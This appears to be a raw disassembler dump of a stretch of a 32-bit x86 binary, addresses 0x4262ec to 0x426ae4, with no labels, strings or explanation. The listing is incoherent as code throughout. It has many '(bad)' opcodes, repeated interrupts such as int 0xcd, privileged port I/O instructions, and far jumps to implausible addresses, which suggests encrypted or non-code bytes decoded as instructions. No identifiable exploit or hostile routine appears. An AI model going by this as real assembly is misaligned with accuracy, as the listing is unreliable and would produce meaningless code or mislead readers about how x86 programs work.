  4262ec:	mov    eax,0x4b0760a
  4262f1:	ins    DWORD PTR es:[edi],dx
  4262f2:	(bad)  
  4262f3:	mov    eax,0xcda2760a
  4262f8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262fe:	(bad)  
  4262ff:	xor    eax,0xf1cd8080
  426304:	mov    eax,0xcf19960a
  426309:	nop
  42630a:	xchg   edx,eax
  42630b:	iret   
  42630c:	sahf   
  42630d:	(bad)  
  42630e:	int    0x99
  426310:	mov    eax,0xcd1d960a
  426315:	aad    0xb8
  426317:	or     dl,BYTE PTR [esi-0x662dfbdf]
  42631d:	mov    eax,0xcf01960a
  426322:	jno    0x426378
  426324:	int    0x3
  426326:	mov    eax,0x40be60a
  42632b:	leave  
  42632c:	xchg   ebp,eax
  42632d:	mov    eax,0xcf05e60a
  426332:	ficomp WORD PTR [eax-0x48]
  426335:	or     ah,dh
  426337:	pop    es
  426338:	mov    eax,0xb809760a
  42633d:	or     dl,dh
  42633f:	retf   0xc5cd
  426342:	mov    eax,0xb8cc760a
  426347:	or     dl,BYTE PTR [edi]
  426349:	ins    BYTE PTR es:[edi],dx
  42634a:	add    BYTE PTR [eax],al
  42634c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426353:	push   edx
  426354:	add    BYTE PTR [eax],al
  426356:	add    bh,cl
  426358:	outs   dx,BYTE PTR ds:[esi]
  426359:	add    edi,DWORD PTR [eax+0x74060a]
  42635f:	add    BYTE PTR [eax],al
  426361:	add    al,0x6d
  426363:	inc    edx
  426364:	mov    eax,0x78060a
  426369:	add    BYTE PTR [eax],al
  42636b:	iret   
  42636c:	outs   dx,BYTE PTR ds:[esi]
  42636d:	xor    BYTE PTR [eax+0x7c060a],bh
  426373:	add    BYTE PTR [eax],al
  426375:	add    al,0x6d
  426377:	xor    bh,BYTE PTR [eax+0x8a060a]
  42637d:	add    BYTE PTR [eax],al
  42637f:	mov    eax,0x8ccf0a
  426384:	add    BYTE PTR [eax],al
  426386:	int    0xc5
  426388:	mov    eax,0x8e060a
  42638d:	add    BYTE PTR [eax],al
  42638f:	int    0x76
  426391:	in     eax,dx
  426392:	int    0x8d
  426394:	adc    DWORD PTR [edi],ebp
  426396:	inc    ebp
  426397:	jge    0x42632b
  426399:	shr    ebx,cl
  42639b:	xchg   edx,eax
  42639c:	int    0x8d
  42639e:	in     eax,dx
  42639f:	int    0x96
  4263a1:	adc    ebx,eax
  4263a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263a4:	mov    esi,0xc93b4229
  4263a9:	cmp    ebx,edx
  4263ab:	shl    edx,cl
  4263ad:	sub    BYTE PTR [ebx-0x2e],dl
  4263b0:	in     al,dx
  4263b1:	outs   dx,BYTE PTR ds:[esi]
  4263b2:	iret   
  4263b3:	aam    0x76
  4263b5:	mov    al,0xb8
  4263b7:	int    0x4e
  4263b9:	das    
  4263ba:	mov    ebx,0xcbbb2f18
  4263bf:	cmp    ecx,DWORD PTR [edx+edx*1]
  4263c2:	sti    
  4263c3:	and    DWORD PTR ds:0xf3e38080,esi
  4263c9:	shl    edx,cl
  4263cb:	das    
  4263cc:	push   ebx
  4263cd:	adc    ecx,DWORD PTR [ecx]
  4263cf:	int3   
  4263d0:	test   DWORD PTR [ebp-0x32ffff01],esp
  4263d6:	lea    esi,[ebp+0x2fbd96cd]
  4263dc:	inc    ebp
  4263dd:	jecxz  0x426371
  4263df:	shl    ebx,cl
  4263e1:	xchg   edx,eax
  4263e2:	int    0x96
  4263e4:	mov    ch,0xcd
  4263e6:	(bad)  
  4263e7:	mov    ebp,0xf73bf03b
  4263ec:	push   ebx
  4263ed:	psrlq  mm5,mm2
  4263f0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263f6:	(bad)  
  4263f7:	popa   
  4263f8:	int    0x76
  4263fa:	in     eax,dx
  4263fb:	int    0x8d
  4263fd:	adc    DWORD PTR [edi],ebp
  4263ff:	inc    ebp
  426400:	jge    0x426394
  426402:	shr    ebx,cl
  426404:	xchg   edx,eax
  426405:	int    0x8d
  426407:	in     eax,dx
  426408:	int    0x96
  42640a:	adc    DWORD PTR [ebx],edi
  42640c:	leave  
  42640d:	cmp    ebx,edx
  42640f:	shl    edx,cl
  426411:	sub    BYTE PTR [ebx-0x2e],dl
  426414:	in     al,dx
  426415:	outs   dx,BYTE PTR ds:[esi]
  426416:	iret   
  426417:	aam    0x76
  426419:	add    DWORD PTR [eax-0x44d0b133],edi
  42641f:	sbb    BYTE PTR [edi],ch
  426421:	mov    ebx,0x120c3bcb
  426426:	sti    
  426427:	and    DWORD PTR ds:0xf3e38080,esi
  42642d:	shl    edx,cl
  42642f:	das    
  426430:	push   ebx
  426431:	adc    ecx,DWORD PTR [ecx]
  426433:	int3   
  426434:	test   esp,ecx
  426436:	inc    DWORD PTR [eax]
  426438:	add    ch,cl
  42643a:	lea    esi,[ebp+0x2fbd96cd]
  426440:	inc    ebp
  426441:	jecxz  0x4263d5
  426443:	shl    ebx,cl
  426445:	xchg   edx,eax
  426446:	int    0x96
  426448:	mov    ch,0xcd
  42644a:	(bad)  
  42644b:	mov    ebp,0xf73bf03b
  426450:	push   ebx
  426451:	psrlq  mm5,mm2
  426454:	sub    BYTE PTR [edi-0x7406fb2d],al
  42645a:	(bad)  
  42645b:	popa   
  42645c:	int    0x76
  42645e:	in     eax,dx
  42645f:	int    0x8d
  426461:	adc    DWORD PTR [edi],ebp
  426463:	inc    ebp
  426464:	jge    0x4263f8
  426466:	shr    ebx,cl
  426468:	xchg   edx,eax
  426469:	int    0x8d
  42646b:	in     eax,dx
  42646c:	int    0x96
  42646e:	adc    DWORD PTR [ebx],edi
  426470:	leave  
  426471:	cmp    ebx,edx
  426473:	shl    edx,cl
  426475:	sub    BYTE PTR [ebx-0x2e],dl
  426478:	in     al,dx
  426479:	je     0x42644a
  42647b:	push   ebp
  42647c:	jbe    0x4264ea
  42647e:	add    BYTE PTR [eax],al
  426480:	add    BYTE PTR [eax-0x44d0b133],bh
  426486:	sbb    BYTE PTR [edi],ch
  426488:	mov    ebx,0x120c3bcb
  42648d:	sti    
  42648e:	and    DWORD PTR ds:0xf3e38080,esi
  426494:	shl    edx,cl
  426496:	das    
  426497:	push   ebx
  426498:	adc    ecx,DWORD PTR [ecx]
  42649a:	int3   
  42649b:	test   DWORD PTR ds:0xcd0000ff,eax
  4264a1:	lea    esi,[ebp+0x2fbd96cd]
  4264a7:	inc    ebp
  4264a8:	jecxz  0x42643c
  4264aa:	shl    ebx,cl
  4264ac:	xchg   edx,eax
  4264ad:	int    0x96
  4264af:	mov    ch,0xcd
  4264b1:	(bad)  
  4264b2:	mov    ebp,0xf73bf03b
  4264b7:	push   ebx
  4264b8:	psrlq  mm5,mm2
  4264bb:	sub    BYTE PTR [edi-0x7706fb2d],al
  4264c1:	(bad)  
  4264c2:	mov    ebx,0xffb506cf
  4264c7:	add    BYTE PTR [eax],al
  4264c9:	or     dh,BYTE PTR [esi-0x7]
  4264cc:	int    0x76
  4264ce:	stc    
  4264cf:	pop    edi
  4264d0:	inc    esi
  4264d1:	pop    esp
  4264d2:	inc    ebp
  4264d3:	xchg   edi,eax
  4264d4:	or     cl,BYTE PTR [eax+0x79245161]
  4264da:	daa    
  4264db:	or     dh,BYTE PTR [eax-0x7c]
  4264de:	int    0x6
  4264e0:	mov    ch,0xff
  4264e2:	add    BYTE PTR [eax],al
  4264e4:	int    0x57
  4264e6:	mov    ebp,0xa0000ff
  4264eb:	(bad)  
  4264ec:	mov    ebp,0x8621d169
  4264f1:	xor    eax,0x62fd343
  4264f6:	pusha  
  4264f7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  426501:	add    BYTE PTR [eax-0x7fca76a3],0x80
  426508:	mov    eax,0xfff9060a
  42650d:	add    BYTE PTR [eax],al
  42650f:	int    0xc5
  426511:	mov    eax,0xff03060a
  426516:	add    BYTE PTR [eax],al
  426518:	pop    ebp
  426519:	es xor eax,0xab88080
  42651f:	push   es
  426520:	std    
  426521:	inc    DWORD PTR [eax]
  426523:	add    BYTE PTR [ebp-0x5d],bl
  426526:	xor    eax,0xab88080
  42652b:	push   es
  42652c:	(bad)  
  42652d:	inc    DWORD PTR [eax]
  42652f:	add    BYTE PTR [ebp+0x1e],bl
  426532:	xor    eax,0xab88080
  426537:	push   es
  426538:	add    BYTE PTR [eax],0x0
  42653b:	add    BYTE PTR [ebp*2-0x47823218],al
  426542:	or     cl,bh
  426544:	xchg   edx,eax
  426545:	add    BYTE PTR [eax],al
  426547:	add    ch,cl
  426549:	jbe    0x42657b
  42654b:	pop    edi
  42654c:	dec    ebx
  42654d:	xor    eax,0xab88080
  426552:	iret   
  426553:	test   BYTE PTR [eax],al
  426555:	add    BYTE PTR [eax],al
  426557:	add    al,0xd3
  426559:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42655f:	add    BYTE PTR [eax],al
  426561:	pop    edi
  426562:	push   esi
  426563:	xor    eax,0xab88080
  426568:	iret   
  426569:	mov    BYTE PTR [eax],al
  42656b:	add    BYTE PTR [eax],al
  42656d:	add    al,0xd3
  42656f:	pushf  
  426570:	mov    eax,0x4acf0a
  426575:	add    BYTE PTR [eax],al
  426577:	int    0xc
  426579:	mov    eax,0x4ccf0a
  42657e:	add    BYTE PTR [eax],al
  426580:	pop    edi
  426581:	add    al,0x35
  426583:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42658a:	add    BYTE PTR [eax],al
  42658c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42658f:	adc    DWORD PTR [eax-0x80],edx
  426592:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426599:	add    bl,dl
  42659b:	mov    ebp,0x151a5f92
  4265a0:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  4265a7:	add    BYTE PTR [eax],al
  4265a9:	pop    edi
  4265aa:	call   0xcf0a:0xb88080eb
  4265b1:	adc    al,0x0
  4265b3:	add    BYTE PTR [eax],al
  4265b5:	int    0x8d
  4265b7:	xor    BYTE PTR [edx+eax*1],al
  4265ba:	call   ebx
  4265bc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4265c0:	or     al,BYTE PTR [esi]
  4265c2:	adc    eax,0xcd0000ff
  4265c7:	jbe    0x426615
  4265c9:	int    0x8d
  4265cb:	dec    esp
  4265cc:	cmp    edi,DWORD PTR [ecx-0x2d]
  4265cf:	mov    ebp,0xff020492
  4265d4:	shl    edx,cl
  4265d6:	sub    BYTE PTR [ebx-0x2d],dl
  4265d9:	leave  
  4265da:	add    eax,0xff1d06
  4265df:	add    BYTE PTR [eax],al
  4265e1:	add    BYTE PTR [eax+0x1506cf80],al
  4265e7:	inc    DWORD PTR [eax]
  4265e9:	add    BYTE PTR [eax-0x33],dh
  4265ec:	jbe    0x42661e
  4265ee:	int    0x8d
  4265f0:	xor    BYTE PTR [ebx],bh
  4265f2:	jns    0x4265c7
  4265f4:	mov    ebp,0xff020492
  4265f9:	shl    edx,cl
  4265fb:	sub    BYTE PTR [ebx-0x2d],dl
  4265fe:	jo     0x4265cf
  426600:	push   es
  426601:	stc    
  426602:	inc    DWORD PTR [eax]
  426604:	add    BYTE PTR [eax-0x33],dh
  426607:	jbe    0x4265fe
  426609:	int    0x1
  42660b:	cmp    eax,0xc9808081
  426610:	push   es
  426611:	sbb    BYTE PTR [eax],al
  426613:	add    BYTE PTR [eax],al
  426615:	inc    eax
  426616:	retf   
  426617:	fwait
  426618:	xor    eax,0x76cd5000
  42661d:	adc    al,0x0
  42661f:	icebp  
  426620:	or     dh,BYTE PTR [esi-0x7]
  426623:	int    0x76
  426625:	stc    
  426626:	push   es
  426627:	ins    DWORD PTR es:[edi],dx
  426628:	aam    0x4a
  42662a:	adc    dl,BYTE PTR [esi+0x68]
  42662d:	or     BYTE PTR [ebx+ecx*1],bl
  426630:	fmul   QWORD PTR [ebx-0x17]
  426633:	(bad)  
  426634:	int    0x8d
  426636:	dec    esp
  426637:	int    0x96
  426639:	dec    esp
  42663a:	sar    bh,0x3b
  42663d:	setl   BYTE PTR [ebx]
  426640:	icebp  
  426641:	shr    edx,cl
  426643:	sub    bl,dl
  426645:	jmp    0x4265d9
  426647:	push   ebx
  426648:	adc    ecx,ebp
  42664a:	xchg   esi,eax
  42664b:	cmc    
  42664c:	int    0xa2
  42664e:	and    eax,0x5e808081
  426653:	dec    edx
  426654:	das    
  426655:	push   es
  426656:	popa   
  426657:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42665d:	int    0x96
  42665f:	dec    esp
  426660:	cmp    ecx,DWORD PTR [edi]
  426662:	shr    ebx,cl
  426664:	xchg   edx,eax
  426665:	cmp    esi,ecx
  426667:	shr    edx,cl
  426669:	sub    BYTE PTR [ebx+0x13],dl
  42666c:	int    0x96
  42666e:	cmc    
  42666f:	int    0xa2
  426671:	in     al,0x81
  426673:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42667a:	int    0x96
  42667c:	dec    esp
  42667d:	cmp    ecx,DWORD PTR [edi]
  42667f:	shr    ebx,cl
  426681:	xchg   edx,eax
  426682:	cmp    esi,ecx
  426684:	shr    edx,cl
  426686:	sub    BYTE PTR [ebx+0x13],dl
  426689:	int    0x96
  42668b:	cmc    
  42668c:	int    0xa2
  42668e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426694:	pop    edi
  426695:	xor    ax,0x8080
  426699:	mov    eax,0x24cf0a
  42669e:	add    BYTE PTR [eax],al
  4266a0:	int    0xc
  4266a2:	mov    eax,0x28cf0a
  4266a7:	add    BYTE PTR [eax],al
  4266a9:	pop    edi
  4266aa:	es xor eax,0xab88080
  4266b0:	iret   
  4266b1:	sub    al,0x0
  4266b3:	add    BYTE PTR [eax],al
  4266b5:	pop    edi
  4266b6:	daa    
  4266b7:	xor    eax,0xab88080
  4266bc:	iret   
  4266bd:	xor    al,BYTE PTR [eax]
  4266bf:	add    BYTE PTR [eax],al
  4266c1:	add    al,0xd3
  4266c3:	test   eax,0x34cf0ab8
  4266c8:	add    BYTE PTR [eax],al
  4266ca:	add    BYTE PTR [edi-0x69],bl
  4266cd:	xor    eax,0xab88080
  4266d2:	iret   
  4266d3:	cmp    BYTE PTR [eax],al
  4266d5:	add    BYTE PTR [eax],al
  4266d7:	add    al,0xd3
  4266d9:	mov    dl,0xb8
  4266db:	or     cl,bh
  4266dd:	cmp    al,0x0
  4266df:	add    BYTE PTR [eax],al
  4266e1:	pop    edi
  4266e2:	fwait
  4266e3:	xor    eax,0xab88080
  4266e8:	iret   
  4266e9:	inc    eax
  4266ea:	add    BYTE PTR [eax],al
  4266ec:	add    ch,cl
  4266ee:	or     al,0xb8
  4266f0:	or     cl,bh
  4266f2:	inc    esp
  4266f3:	add    BYTE PTR [eax],al
  4266f5:	add    BYTE PTR [edi+0x17],bl
  4266f8:	xor    eax,0xab88080
  4266fd:	iret   
  4266fe:	dec    eax
  4266ff:	add    BYTE PTR [eax],al
  426701:	add    BYTE PTR [edi+0x26],bl
  426704:	pop    esi
  426705:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  42670c:	add    BYTE PTR [eax],al
  42670e:	pop    edi
  42670f:	cmp    esi,DWORD PTR [edx]
  426711:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  426718:	add    BYTE PTR [eax],al
  42671a:	jns    0x426792
  42671c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42671d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42671e:	pop    edi
  42671f:	pop    esp
  426720:	adc    eax,0xab88080
  426725:	iret   
  426726:	push   esp
  426727:	add    BYTE PTR [eax],al
  426729:	add    BYTE PTR [ebx+edx*8],al
  42672c:	pop    esp
  42672d:	mov    eax,0x58cf0a
  426732:	add    BYTE PTR [eax],al
  426734:	jns    0x4267ac
  426736:	fisttp WORD PTR [ecx+0x79]
  426739:	jbe    0x4266e4
  42673b:	inc    ecx
  42673c:	jns    0x4267b4
  42673e:	loope  0x4266e3
  426740:	pop    edi
  426741:	fcom   st(4)
  426743:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42674a:	add    BYTE PTR [eax],al
  42674c:	jns    0x4267c4
  42674e:	lods   eax,DWORD PTR ds:[esi]
  42674f:	push   edi
  426750:	pop    edi
  426751:	jnp    0x4267a8
  426753:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42675a:	add    BYTE PTR [eax],al
  42675c:	jns    0x4267d4
  42675e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426762:	jmp    0x8080:0x35a15f47
  426769:	mov    eax,0x64cf0a
  42676e:	add    BYTE PTR [eax],al
  426770:	jns    0x4267e8
  426772:	in     eax,0x18
  426774:	int    0x8d
  426776:	xor    ch,cl
  426778:	xchg   esi,eax
  426779:	xor    BYTE PTR [ebx],bh
  42677b:	(bad)  
  42677d:	icebp  
  42677e:	shr    ebx,cl
  426780:	xchg   edx,eax
  426781:	shr    edx,cl
  426783:	sub    BYTE PTR [ebx+0x13],dl
  426786:	in     al,dx
  426787:	xchg   esp,eax
  426788:	int    0x96
  42678a:	xor    ch,cl
  42678c:	out    0x30,al
  42678e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426794:	stc    
  426795:	shr    ecx,cl
  426797:	sub    BYTE PTR [ebx-0x27],dl
  42679a:	xor    edx,DWORD PTR [ebx]
  42679c:	das    
  42679d:	pop    ecx
  42679e:	mov    WORD PTR [ebp-0x5b],cs
  4267a1:	int    0x96
  4267a3:	xor    ch,cl
  4267a5:	out    0x30,al
  4267a7:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267ad:	stc    
  4267ae:	shr    ecx,cl
  4267b0:	sub    BYTE PTR [ebx-0x27],dl
  4267b3:	int    0xe6
  4267b5:	stc    
  4267b6:	add    al,0x2
  4267b8:	adc    DWORD PTR [edx],0xffffffd3
  4267bb:	fwait
  4267bc:	add    BYTE PTR [eax+0x9033380],0x8c
  4267c3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4267c5:	int    0x96
  4267c7:	xor    ch,cl
  4267c9:	lea    esi,[eax]
  4267cb:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  4267d1:	sub    bl,dl
  4267d3:	repz xchg edx,eax
  4267d5:	push   ebx
  4267d6:	jecxz  0x4267a5
  4267d8:	(bad)  
  4267d9:	stc    
  4267da:	xchg   DWORD PTR [ebx],edx
  4267dc:	int    0x96
  4267de:	xor    ch,cl
  4267e0:	out    0x30,al
  4267e2:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4267e8:	xchg   edx,eax
  4267e9:	shr    ecx,cl
  4267eb:	sub    BYTE PTR [ebx-0x27],dl
  4267ee:	add    al,0xd2
  4267f0:	mov    BYTE PTR [edx],cl
  4267f2:	(bad)  
  4267f3:	stc    
  4267f4:	inc    ebx
  4267f5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267fb:	int    0x96
  4267fd:	xor    BYTE PTR [ebx],bh
  4267ff:	(bad)  
  426801:	icebp  
  426802:	shr    ebx,cl
  426804:	xchg   edx,eax
  426805:	shr    edx,cl
  426807:	sub    BYTE PTR [ebx+0x13],dl
  42680a:	or     cl,bh
  42680c:	adc    eax,0xcd0000ff
  426811:	lea    ecx,[ebp+ecx*8-0x6a]
  426815:	dec    esp
  426816:	cmp    ecx,DWORD PTR [edi]
  426818:	cmp    esi,ecx
  42681a:	shr    edx,cl
  42681c:	sub    bl,dl
  42681e:	jmp    0x4267b2
  426820:	push   ebx
  426821:	adc    ecx,edi
  426823:	xchg   esi,eax
  426824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	or     dl,BYTE PTR ds:0xff1dcf
  42682b:	add    BYTE PTR [ecx+0x6b],ah
  42682e:	xor    eax,0x13cd8080
  426833:	mov    eax,0x4258d0a
  426838:	rcl    edx,cl
  42683a:	int    0xfa
  42683c:	mov    eax,0xcf29e60a
  426841:	loopne 0x4267ec
  426843:	mov    eax,0x42de60a
  426848:	leave  
  426849:	test   BYTE PTR [eax-0x304d19f6],bh
  42684f:	loopne 0x426865
  426851:	mov    eax,0x435e60a
  426856:	leave  
  426857:	loop   0x426811
  426859:	or     ah,dh
  42685b:	cmp    ebp,ecx
  42685d:	cli    
  42685e:	mov    eax,0xcd3de60a
  426863:	add    edi,DWORD PTR [eax-0x32be19f6]
  426869:	cld    
  42686a:	mov    eax,0xcd45e60a
  42686f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426875:	cli    
  426876:	mov    eax,0xcfc2e60a
  42687b:	loopne 0x4268a6
  42687d:	mov    eax,0x455e60a
  426882:	leave  
  426883:	test   BYTE PTR [eax-0x30a619f6],bh
  426889:	loopne 0x426820
  42688b:	mov    eax,0x45de60a
  426890:	leave  
  426891:	loop   0x42684b
  426893:	or     ah,dh
  426895:	popa   
  426896:	mov    eax,0xb8658d0a
  42689b:	or     dl,BYTE PTR [esi-0x47f33297]
  4268a1:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  4268a7:	int    0x96
  4268a9:	dec    esp
  4268aa:	cmp    esi,ecx
  4268ac:	cmp    ecx,DWORD PTR [edi]
  4268ae:	shr    edx,cl
  4268b0:	sub    bl,dl
  4268b2:	jmp    0x426846
  4268b4:	push   ebx
  4268b5:	adc    ecx,ebp
  4268b7:	xchg   esi,eax
  4268b8:	dec    esp
  4268b9:	int    0xe6
  4268bb:	dec    esp
  4268bc:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  4268c2:	mov    WORD PTR [ebp-0x2c06c430],cs
  4268c8:	jmp    0x301bbbf5
  4268cd:	mov    ebx,0xb8d93b5e
  4268d2:	or     dh,BYTE PTR [ecx]
  4268d4:	int    0x8d
  4268d6:	dec    esp
  4268d7:	int    0x96
  4268d9:	dec    esp
  4268da:	cmp    ecx,DWORD PTR [edi]
  4268dc:	cmp    esi,ecx
  4268de:	shr    ebx,cl
  4268e0:	xchg   edx,eax
  4268e1:	shr    edx,cl
  4268e3:	sub    BYTE PTR [ebx+0x13],dl
  4268e6:	int    0x96
  4268e8:	dec    esp
  4268e9:	iret   
  4268ea:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268f0:	out    0x4c,al
  4268f2:	shl    ebx,cl
  4268f4:	xchg   edx,eax
  4268f5:	cmp    edi,ecx
  4268f7:	shr    ecx,cl
  4268f9:	sub    BYTE PTR [ebx-0x27],dl
  4268fc:	das    
  4268fd:	mov    ebx,0xb8d93b5e
  426902:	or     dh,BYTE PTR [ecx]
  426904:	int    0x8d
  426906:	dec    esp
  426907:	int    0x96
  426909:	dec    esp
  42690a:	cmp    esi,ecx
  42690c:	shr    edx,cl
  42690e:	sub    BYTE PTR [ebx],bh
  426910:	psrlq  mm5,mm3
  426913:	xchg   edx,eax
  426914:	push   ebx
  426915:	adc    ecx,ebp
  426917:	xchg   esi,eax
  426918:	dec    esp
  426919:	int    0xe6
  42691b:	dec    esp
  42691c:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426922:	stc    
  426923:	shr    ecx,cl
  426925:	sub    BYTE PTR [ebx-0x27],dl
  426928:	mov    eax,0x9096cc0a
  42692d:	inc    DWORD PTR [eax]
  42692f:	add    ch,cl
  426931:	lea    ecx,[ebp+ecx*8-0x6a]
  426935:	dec    esp
  426936:	cmp    esi,ecx
  426938:	shr    edx,cl
  42693a:	sub    BYTE PTR [ebx],bh
  42693c:	psrlq  mm5,mm3
  42693f:	xchg   edx,eax
  426940:	push   ebx
  426941:	adc    ecx,ebp
  426943:	xchg   esi,eax
  426944:	dec    esp
  426945:	int    0xe6
  426947:	dec    esp
  426948:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42694e:	stc    
  42694f:	shr    ecx,cl
  426951:	sub    BYTE PTR [ebx-0x27],dl
  426954:	mov    eax,0xa496cc0a
  426959:	inc    DWORD PTR [eax]
  42695b:	add    ch,cl
  42695d:	lea    esi,[eax]
  42695f:	int    0x96
  426961:	xor    BYTE PTR [ebx],bh
  426963:	icebp  
  426964:	cmp    ecx,DWORD PTR [edi]
  426966:	shr    edx,cl
  426968:	sub    bl,dl
  42696a:	jmp    0x4268fe
  42696c:	push   ebx
  42696d:	adc    ecx,ebp
  42696f:	xchg   esi,eax
  426970:	xor    ch,cl
  426972:	out    0x30,al
  426974:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42697a:	xchg   edx,eax
  42697b:	shr    ecx,cl
  42697d:	sub    BYTE PTR [ebx-0x27],dl
  426980:	xchg   DWORD PTR [ebx],edx
  426982:	or     cl,bh
  426984:	adc    eax,0xcd0000ff
  426989:	lea    ecx,[ebp+ecx*8-0x6a]
  42698d:	dec    esp
  42698e:	int    0xe6
  426990:	mov    BYTE PTR [ebx],bh
  426992:	icebp  
  426993:	cmp    ecx,DWORD PTR [edi]
  426995:	shr    ebx,cl
  426997:	xchg   edx,eax
  426998:	shr    edx,cl
  42699a:	sub    BYTE PTR [ebx+0x13],dl
  42699d:	iret   
  42699e:	push   es
  42699f:	nop
  4269a0:	inc    DWORD PTR [eax]
  4269a2:	add    BYTE PTR [edx],cl
  4269a4:	add    eax,0xff1dcf
  4269a9:	add    bh,cl
  4269ab:	jbe    0x42697d
  4269ad:	mov    ebp,0x10d8
  4269b2:	int    0x8d
  4269b4:	xor    ch,cl
  4269b6:	xchg   esi,eax
  4269b7:	xor    al,al
  4269b9:	(bad)  
  4269ba:	cmp    ecx,DWORD PTR [edi]
  4269bc:	stos   BYTE PTR es:[edi],al
  4269bd:	cmp    ebx,ecx
  4269bf:	shr    ebx,cl
  4269c1:	xchg   edx,eax
  4269c2:	shr    edx,cl
  4269c4:	sub    BYTE PTR [ebx+0x13],dl
  4269c7:	or     al,BYTE PTR ds:0xff1dcf
  4269cd:	add    ch,cl
  4269cf:	jbe    0x426a1d
  4269d1:	int    0x8d
  4269d3:	dec    esp
  4269d4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269d7:	mov    ebp,0xd3f03b92
  4269dc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269e0:	aam    0x3c
  4269e2:	iret   
  4269e3:	push   es
  4269e4:	adc    eax,0x700000ff
  4269e9:	int    0x76
  4269eb:	xor    ch,cl
  4269ed:	lea    esi,[eax]
  4269ef:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269f2:	mov    ebp,0xd3f03b92
  4269f7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269fb:	jo     0x4269cc
  4269fd:	push   es
  4269fe:	and    al,0x0
  426a00:	add    BYTE PTR [eax],al
  426a02:	jo     0x4269d1
  426a04:	jbe    0x426a1a
  426a06:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  426a0d:	int    0x8d
  426a0f:	dec    esp
  426a10:	cmp    edi,DWORD PTR [ecx+0x3b]
  426a13:	lock int 0xe6
  426a16:	mov    bl,dl
  426a18:	mov    ebp,0x28f2d392
  426a1d:	push   ebx
  426a1e:	ror    edi,cl
  426a20:	iret   
  426a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a22:	inc    DWORD PTR [eax]
  426a24:	add    BYTE PTR [edx],cl
  426a26:	int3   
  426a27:	push   es
  426a28:	sbb    eax,0xcf0000ff
  426a2d:	jbe    0x426a54
  426a2f:	mov    ebp,0xeff5
  426a34:	int    0x8d
  426a36:	xor    ch,cl
  426a38:	xchg   esi,eax
  426a39:	xor    BYTE PTR [ebx],bh
  426a3b:	psrlq  mm5,mm3
  426a3e:	xchg   edx,eax
  426a3f:	add    al,0xfb
  426a41:	call   ebx
  426a43:	jmp    0xcf05:0xa135328
  426a4a:	sbb    eax,0x610000ff
  426a4f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a55:	xor    eax,0xab88080
  426a5a:	push   es
  426a5b:	jo     0x426a5d
  426a5d:	add    BYTE PTR [eax],al
  426a5f:	iret   
  426a60:	mov    dh,BYTE PTR [eax]
  426a62:	mov    eax,0xb4cf0a
  426a67:	add    BYTE PTR [eax],al
  426a69:	pop    ebp
  426a6a:	adc    BYTE PTR ds:0xab88080,dh
  426a70:	push   es
  426a71:	bound  eax,QWORD PTR [eax]
  426a73:	add    BYTE PTR [eax],al
  426a75:	int    0xd2
  426a77:	mov    eax,0x94060a
  426a7c:	add    BYTE PTR [eax],al
  426a7e:	int    0xd3
  426a80:	mov    eax,0x98060a
  426a85:	add    BYTE PTR [eax],al
  426a87:	add    al,0x6d
  426a89:	sub    ch,cl
  426a8b:	jge    0x426a45
  426a8d:	or     cl,bh
  426a8f:	mov    eax,0xcf000000
  426a94:	mov    ch,BYTE PTR [eax]
  426a96:	mov    eax,0xbccf0a
  426a9b:	add    BYTE PTR [eax],al
  426a9d:	add    al,0xd3
  426a9f:	pusha  
  426aa0:	mov    eax,0xc0cf0a
  426aa5:	add    BYTE PTR [eax],al
  426aa7:	iret   
  426aa8:	mov    cl,BYTE PTR [edx-0x48]
  426aab:	or     cl,bh
  426aad:	les    eax,FWORD PTR [eax]
  426aaf:	add    BYTE PTR [eax],al
  426ab1:	int    0xf9
  426ab3:	mov    eax,0x9c670a
  426ab8:	add    BYTE PTR [eax],al
  426aba:	iret   
  426abb:	loopne 0x426a5d
  426abd:	pop    edi
  426abe:	add    BYTE PTR ds:0xab88080,dh
  426ac4:	iret   
  426ac5:	enter  0x0,0x0
  426ac9:	iret   
  426aca:	mov    bh,bh
  426acc:	mov    eax,0x90cf0a
  426ad1:	add    BYTE PTR [eax],al
  426ad3:	mov    eax,0xa0670a
  426ad8:	add    BYTE PTR [eax],al
  426ada:	add    al,0xc9
  426adc:	stc    
  426add:	mov    eax,0xa4670a
  426ae2:	add    BYTE PTR [eax],al
  426ae4:	int    0xf9
